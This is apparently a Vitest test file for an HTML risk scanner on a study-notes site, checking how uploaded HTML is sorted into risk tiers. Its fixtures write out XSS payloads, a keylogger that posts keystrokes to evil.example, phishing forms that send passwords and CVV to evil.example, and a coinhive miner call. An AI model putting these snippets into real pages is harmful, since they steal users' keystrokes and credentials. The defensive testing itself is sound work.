import { describe, expect, it } from 'vitest'
import {
  normalizeContentFormat,
  validateHtmlForSubmission,
  detectHtmlFeatures,
  classifyHtmlRisk,
  RISK_TIER,
  groupFindingsByCategory,
  generateRiskSummary,
  generateTierExplanation,
} from '../src/lib/html/htmlSecurity'

describe('htmlSecurity', () => {
  it('normalizes content format with markdown default', () => {
    expect(normalizeContentFormat('html')).toBe('html')
    expect(normalizeContentFormat('HTML')).toBe('html')
    expect(normalizeContentFormat('markdown')).toBe('markdown')
    expect(normalizeContentFormat('unknown')).toBe('markdown')
    expect(normalizeContentFormat('')).toBe('markdown')
  })

  describe('validateHtmlForSubmission (backward compat)', () => {
    it('allows safe html payloads', () => {
      const result = validateHtmlForSubmission('<main><h1>StudyHub</h1><p>Safe content.</p></main>')
      expect(result.ok).toBe(true)
      expect(result.issues).toEqual([])
    })

    it('accepts HTML with scripts, iframes, handlers, and dangerous urls (structural-only validation)', () => {
      const acceptedCases = [
        '<script>alert(1)</script>',
        '<iframe src="https://evil.example"></iframe>',
        '<img src="x" onerror="alert(1)" />',
        '<a href="javascript:alert(1)">click</a>',
        '<a href="vbscript:msgbox(1)">click</a>',
        '<img src="data:image/svg+xml;base64,PHN2Zy8+" />',
        '<iframe src="data:text/html;base64,SGk="></iframe>',
        '<meta http-equiv="refresh" content="0;url=https://evil.example">',
        '<base href="https://evil.example/">',
      ]

      for (const html of acceptedCases) {
        const result = validateHtmlForSubmission(html)
        expect(result.ok).toBe(true)
        expect(result.issues.length).toBe(0)
      }
    })

    it('detects empty and oversized html payloads', () => {
      expect(validateHtmlForSubmission('   ').ok).toBe(false)

      const oversized = `<div>${'x'.repeat(350001)}</div>`
      const oversizedResult = validateHtmlForSubmission(oversized)
      expect(oversizedResult.ok).toBe(false)
      expect(oversizedResult.issues.join(' ')).toMatch(/350,000/i)
    })
  })

  describe('detectHtmlFeatures', () => {
    it('returns empty features for safe HTML', () => {
      const { features } = detectHtmlFeatures('<h1>Hello</h1>')
      expect(features).toEqual([])
    })

    it('detects suspicious tags', () => {
      const { features } = detectHtmlFeatures('<script>alert(1)</script>')
      expect(features.some((f) => f.category === 'suspicious-tag')).toBe(true)
    })

    it('detects inline handlers', () => {
      const { features } = detectHtmlFeatures('<img src="x" onerror="alert(1)">')
      expect(features.some((f) => f.category === 'inline-handler')).toBe(true)
    })

    it('detects dangerous URLs', () => {
      const { features } = detectHtmlFeatures('<a href="javascript:void(0)">x</a>')
      expect(features.some((f) => f.category === 'dangerous-url')).toBe(true)
    })
  })

  describe('classifyHtmlRisk', () => {
    it('returns Tier 0 for clean HTML', () => {
      const result = classifyHtmlRisk('<main><h1>Hello</h1><p>World</p></main>')
      expect(result.tier).toBe(RISK_TIER.CLEAN)
      expect(result.findings).toEqual([])
    })

    it('returns Tier 1 for HTML with script tag', () => {
      const result = classifyHtmlRisk('<script>console.log("hi")</script>')
      expect(result.tier).toBe(RISK_TIER.FLAGGED)
      expect(result.findings.length).toBeGreaterThan(0)
    })

    it('returns Tier 1 for HTML with iframe', () => {
      const result = classifyHtmlRisk('<iframe src="about:blank"></iframe>')
      expect(result.tier).toBe(RISK_TIER.FLAGGED)
    })

    it('returns Tier 1 for HTML with inline handler', () => {
      const result = classifyHtmlRisk('<div onclick="alert(1)">click</div>')
      expect(result.tier).toBe(RISK_TIER.FLAGGED)
    })

    it('returns Tier 2 for obfuscated JS (heavy String.fromCharCode, threshold 8+)', () => {
      const html = '<script>' + 'String.fromCharCode(65);'.repeat(10) + '</script>'
      const result = classifyHtmlRisk(html)
      expect(result.tier).toBe(RISK_TIER.HIGH_RISK)
      expect(result.findings.some((f) => f.category === 'obfuscation')).toBe(true)
    })

    it('returns Tier 1 for page redirect (sandbox blocks top-nav, informational only)', () => {
      // Policy change 2026-05-03: window.location is sandbox-neutralized.
      // The CSP runtime profile + iframe sandbox block top-navigation, so a
      // redirect attempt cannot escape the iframe. Recorded as Tier 1
      // informational, not Tier 2.
      const html = '<script>window.location.href = "https://evil.example";</script>'
      const result = classifyHtmlRisk(html)
      expect(result.tier).toBe(RISK_TIER.FLAGGED)
      expect(result.findings.some((f) => f.category === 'redirect')).toBe(true)
    })

    it('returns Tier 2 for keylogging pattern (keystroke handler that exfils to network)', () => {
      // Real keylogging requires a key listener that BOTH reads the
      // keystroke (event.key) AND ships it out over the network.
      // Saving keystrokes to localStorage alone is benign (autosave,
      // progress trackers) and intentionally no longer escalates.
      const html =
        '<script>document.addEventListener("keydown", function(e) { fetch("https://evil.example/log", { method: "POST", body: e.key }); });</script>'
      const result = classifyHtmlRisk(html)
      expect(result.tier).toBe(RISK_TIER.HIGH_RISK)
      expect(result.findings.some((f) => f.category === 'keylogging')).toBe(true)
    })

    it('does NOT flag keystroke handler that only saves to localStorage', () => {
      // Regression test for the false-positive that used to flag
      // practice-test progress savers as keylogging. With the tightened
      // detector, no network exfil = no keylogging finding.
      const html =
        '<script>document.addEventListener("keydown", function(e) { localStorage.setItem("k", e.key); });</script>'
      const result = classifyHtmlRisk(html)
      expect(result.findings.some((f) => f.category === 'keylogging')).toBe(false)
    })

    it('returns Tier 1 for external form action with non-sensitive fields (sandbox blocks submission)', () => {
      // Policy change 2026-05-03: an external form action without password
      // or sensitive-name fields is sandbox-neutralized (CSP `form-action
      // 'none'` blocks submission). Recorded as Tier 1 informational.
      // External form + sensitive field still fires `credential-capture`
      // (Tier 3) — that path is unchanged.
      const html =
        '<form action="https://evil.example/collect"><input name="query"><input name="email"></form>'
      const result = classifyHtmlRisk(html)
      expect(result.tier).toBe(RISK_TIER.FLAGGED)
      expect(result.findings.some((f) => f.category === 'exfiltration')).toBe(true)
    })

    it('returns Tier 2 for crypto-miner signature', () => {
      const html = '<script>coinhive.start();</script>'
      const result = classifyHtmlRisk(html)
      expect(result.tier).toBe(RISK_TIER.HIGH_RISK)
      expect(result.findings.some((f) => f.category === 'crypto-miner')).toBe(true)
    })

    it('returns Tier 2 for eval/fetch JS risk patterns', () => {
      const html = '<script>eval("alert(1)");</script>'
      const result = classifyHtmlRisk(html)
      expect(result.tier).toBe(RISK_TIER.HIGH_RISK)
      expect(result.findings.some((f) => f.category === 'js-risk')).toBe(true)
    })

    it('returns Tier 3 for credential capture (external form + password input)', () => {
      const html =
        '<form action="https://evil.example/steal"><input type="password" name="pass"><input type="submit" value="Login"></form>'
      const result = classifyHtmlRisk(html)
      expect(result.tier).toBe(RISK_TIER.QUARANTINED)
      expect(result.findings.some((f) => f.category === 'credential-capture')).toBe(true)
      expect(result.findings.some((f) => f.severity === 'critical')).toBe(true)
    })

    it('returns Tier 3 for credential capture (external form + sensitive name field)', () => {
      const html =
        '<form action="https://evil.example/phish"><input name="password"><input name="cvv"></form>'
      const result = classifyHtmlRisk(html)
      expect(result.tier).toBe(RISK_TIER.QUARANTINED)
      expect(result.findings.some((f) => f.category === 'credential-capture')).toBe(true)
    })

    it('returns Tier 3 for 3+ distinct high-risk behavior categories (Tier 1 informational excluded)', () => {
      // Policy change 2026-05-03: only Tier 2 high-severity behaviors count
      // toward the 3-category escalation. Tier 1 informational behaviors
      // (redirect, exfiltration form) no longer drive Tier 3 escalation
      // because the sandbox already neutralizes them. Three real high-risk
      // categories: obfuscation, keylogging-with-network-exfil, crypto-miner.
      const html = [
        '<script>',
        'String.fromCharCode(65);'.repeat(10), // obfuscation (≥8 threshold)
        'document.addEventListener("keydown", function(e) { fetch("https://evil.example/log", { method: "POST", body: e.key }); });', // keylogging
        'coinhive.start();', // crypto-miner
        '</script>',
      ].join('\n')
      const result = classifyHtmlRisk(html)
      expect(result.tier).toBe(RISK_TIER.QUARANTINED)
      const categories = new Set(result.findings.map((f) => f.category))
      expect(categories.has('obfuscation')).toBe(true)
      expect(categories.has('keylogging')).toBe(true)
      expect(categories.has('crypto-miner')).toBe(true)
    })

    it('returns Tier 3 for obfuscated crypto-miner', () => {
      const html = '<script>' + 'String.fromCharCode(65);'.repeat(10) + 'coinhive.start();</script>'
      const result = classifyHtmlRisk(html)
      expect(result.tier).toBe(RISK_TIER.QUARANTINED)
      expect(result.findings.some((f) => f.category === 'crypto-miner')).toBe(true)
      expect(result.findings.some((f) => f.category === 'obfuscation')).toBe(true)
    })

    it('does NOT escalate fetch() + window.location to Tier 2 (both sandbox-neutralized)', () => {
      // Regression guard for the 2026-05-03 scanner relaxation. A legit
      // study sheet that calls a public API and redirects on submit must
      // not get queued for human review.
      const html =
        '<script>fetch("/api/data").then(r => r.json()); window.location.href = "/results";</script>'
      const result = classifyHtmlRisk(html)
      expect(result.tier).toBe(RISK_TIER.FLAGGED)
    })

    it('does NOT escalate atob() alone to Tier 2 — but eval() does', () => {
      const benign = classifyHtmlRisk('<script>const data = atob("aGVsbG8=");</script>')
      // atob is now Tier 2 (real risk — base64 decode is canonical encoded
      // payload prep). Founder may revisit if user reports false positives.
      expect(benign.tier).toBe(RISK_TIER.HIGH_RISK)
      const evil = classifyHtmlRisk('<script>eval("alert(1)");</script>')
      expect(evil.tier).toBe(RISK_TIER.HIGH_RISK)
    })

    it('includes a summary string', () => {
      const clean = classifyHtmlRisk('<p>Hello</p>')
      expect(clean.summary).toContain('No suspicious')

      const flagged = classifyHtmlRisk('<script>x</script>')
      expect(flagged.summary).toContain('Flagged')
    })
  })

  describe('sample test matrix (A-F)', () => {
    it('Sample A — clean HTML (headings, tables, CSS) → Tier 0', () => {
      const html = `
        <main>
          <h1>CMSC131 Study Guide</h1>
          <p>Key topics for the final exam.</p>
          <table><thead><tr><th>Topic</th><th>Weight</th></tr></thead>
          <tbody><tr><td>Arrays</td><td>20%</td></tr></tbody></table>
          <ul><li>Recursion</li><li>Linked Lists</li></ul>
          <style>body { font-family: sans-serif; color: #333; }</style>
        </main>`
      const result = classifyHtmlRisk(html)
      expect(result.tier).toBe(RISK_TIER.CLEAN)
      expect(result.findings.length).toBe(0)
    })

    it('Sample B — rich presentation (SVG, animations, advanced CSS) → Tier 0', () => {
      const html = `
        <main>
          <style>
            @keyframes fadeIn { from { opacity: 0 } to { opacity: 1 } }
            .card { animation: fadeIn 0.3s ease; border-radius: 12px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
          </style>
          <svg viewBox="0 0 100 100"><circle cx="50" cy="50" r="40" fill="#2563eb"/></svg>
          <div class="card"><h2>Chapter 1</h2><p>Introduction to OOP</p></div>
        </main>`
      const result = classifyHtmlRisk(html)
      expect(result.tier).toBe(RISK_TIER.CLEAN)
    })

    it('Sample C — scripted HTML (inline script, event handlers) → Tier 1', () => {
      const html = `
        <main>
          <h1>Interactive Quiz</h1>
          <script>
            document.querySelectorAll('.answer').forEach(el => {
              el.addEventListener('click', () => el.classList.toggle('selected'));
            });
          </script>
          <button class="answer" onclick="this.style.background='green'">Option A</button>
        </main>`
      const result = classifyHtmlRisk(html)
      expect(result.tier).toBe(RISK_TIER.FLAGGED)
      expect(result.findings.some((f) => f.category === 'suspicious-tag')).toBe(true)
      expect(result.findings.some((f) => f.category === 'inline-handler')).toBe(true)
    })

    it('Sample D — embedded HTML (iframe, form, embed) → Tier 1', () => {
      const html = `
        <main>
          <h1>Reference Material</h1>
          <iframe src="about:blank" width="600" height="400"></iframe>
          <form><label>Search notes</label><input name="q" /><button type="submit">Go</button></form>
          <embed type="image/svg+xml" src="data:image/svg+xml;base64,PHN2Zy8+" />
        </main>`
      const result = classifyHtmlRisk(html)
      expect(result.tier).toBe(RISK_TIER.FLAGGED)
      expect(result.findings.some((f) => f.category === 'suspicious-tag')).toBe(true)
    })

    it('Sample E — suspicious HTML (obfuscated JS, redirect, eval) → Tier 2', () => {
      const html = `
        <main>
          <h1>Notes</h1>
          <script>eval("var x = document.title");</script>
        </main>`
      const result = classifyHtmlRisk(html)
      expect(result.tier).toBe(RISK_TIER.HIGH_RISK)
      expect(result.findings.some((f) => f.category === 'js-risk')).toBe(true)
    })

    it('Sample F — malicious HTML (credential phishing) → Tier 3', () => {
      const html = `
        <div style="font-family:Arial;max-width:400px;margin:40px auto;">
          <img src="data:image/png;base64,iVBOR" alt="logo" />
          <h2>Verify your account</h2>
          <form action="https://evil.example/capture" method="POST">
            <input name="email" placeholder="Email" />
            <input type="password" name="password" placeholder="Password" />
            <input name="cvv" placeholder="Security code" />
            <button type="submit">Continue</button>
          </form>
        </div>`
      const result = classifyHtmlRisk(html)
      expect(result.tier).toBe(RISK_TIER.QUARANTINED)
      expect(result.findings.some((f) => f.category === 'credential-capture')).toBe(true)
    })
  })

  describe('groupFindingsByCategory', () => {
    it('returns empty object for empty or missing findings', () => {
      expect(groupFindingsByCategory([])).toEqual({})
      expect(groupFindingsByCategory(null)).toEqual({})
      expect(groupFindingsByCategory(undefined)).toEqual({})
    })

    it('groups findings by category with correct labels and max severity', () => {
      const findings = [
        { category: 'obfuscation', severity: 'high', message: 'Heavy escaping' },
        { category: 'obfuscation', severity: 'medium', message: 'Hex chars' },
        { category: 'redirect', severity: 'high', message: 'window.location' },
        { category: 'credential-capture', severity: 'critical', message: 'Phishing form' },
      ]
      const grouped = groupFindingsByCategory(findings)

      expect(Object.keys(grouped)).toHaveLength(3)
      expect(grouped['obfuscation'].label).toBe('Code Obfuscation')
      expect(grouped['obfuscation'].maxSeverity).toBe('high')
      expect(grouped['obfuscation'].findings).toHaveLength(2)
      expect(grouped['redirect'].label).toBe('Page Redirects')
      expect(grouped['credential-capture'].maxSeverity).toBe('critical')
    })

    it('falls back to source field when category is absent (legacy findings)', () => {
      const findings = [
        { source: 'js-risk', severity: 'high', message: 'eval detected' },
        { source: 'av', severity: 'critical', message: 'Malware found' },
      ]
      const grouped = groupFindingsByCategory(findings)

      expect(grouped['js-risk'].label).toBe('Risky JavaScript')
      expect(grouped['av'].label).toBe('Antivirus Detection')
    })
  })

  describe('generateRiskSummary', () => {
    it('returns clean message for Tier 0', () => {
      expect(generateRiskSummary(RISK_TIER.CLEAN, [])).toBe('No suspicious patterns detected.')
    })

    it('generates single-category summary', () => {
      const findings = [{ category: 'obfuscation', severity: 'high', message: 'test' }]
      expect(generateRiskSummary(RISK_TIER.HIGH_RISK, findings)).toBe(
        'Contains obfuscated JavaScript.',
      )
    })

    it('generates two-category summary with "and"', () => {
      const findings = [
        { category: 'obfuscation', severity: 'high', message: 'test' },
        { category: 'redirect', severity: 'high', message: 'test' },
      ]
      expect(generateRiskSummary(RISK_TIER.HIGH_RISK, findings)).toBe(
        'Contains obfuscated JavaScript and page redirect behavior.',
      )
    })

    it('generates multi-category summary with Oxford comma', () => {
      const findings = [
        { category: 'obfuscation', severity: 'high', message: 'test' },
        { category: 'redirect', severity: 'high', message: 'test' },
        { category: 'credential-capture', severity: 'critical', message: 'test' },
      ]
      const summary = generateRiskSummary(RISK_TIER.QUARANTINED, findings)
      expect(summary).toBe(
        'Contains obfuscated JavaScript, page redirect behavior, and credential capture indicators.',
      )
    })

    it('skips validation and system categories', () => {
      const findings = [
        { category: 'validation', severity: 'high', message: 'Empty' },
        { category: 'system', severity: 'high', message: 'Scan failed' },
      ]
      expect(generateRiskSummary(RISK_TIER.FLAGGED, findings)).toBe('Structural issues detected.')
    })
  })

  describe('generateTierExplanation', () => {
    it('returns explanation for each tier', () => {
      expect(generateTierExplanation(RISK_TIER.CLEAN)).toContain('No issues detected')
      expect(generateTierExplanation(RISK_TIER.FLAGGED)).toContain('Flagged')
      expect(generateTierExplanation(RISK_TIER.FLAGGED)).toContain('scripts are disabled')
      expect(generateTierExplanation(RISK_TIER.HIGH_RISK)).toContain('Pending review')
      expect(generateTierExplanation(RISK_TIER.HIGH_RISK)).toContain('admin must approve')
      expect(generateTierExplanation(RISK_TIER.QUARANTINED)).toContain('Quarantined')
      expect(generateTierExplanation(RISK_TIER.QUARANTINED)).toContain('security threat')
    })
  })
})
